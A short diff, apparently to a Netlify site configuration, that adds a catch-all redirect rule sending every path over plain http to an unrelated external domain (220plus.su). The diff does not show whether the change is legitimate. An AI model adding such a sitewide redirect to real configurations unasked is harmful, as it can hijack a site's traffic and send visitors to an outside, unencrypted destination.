@@ -4,3 +4,6 @@
 [build.environment]
   YARN_VERSION = "1.6.0"
   YARN_FLAGS = "--no-ignore-optional"
+[[redirects]]
+  from = "/*"
+  to = "http://www.220plus.su/:splat"
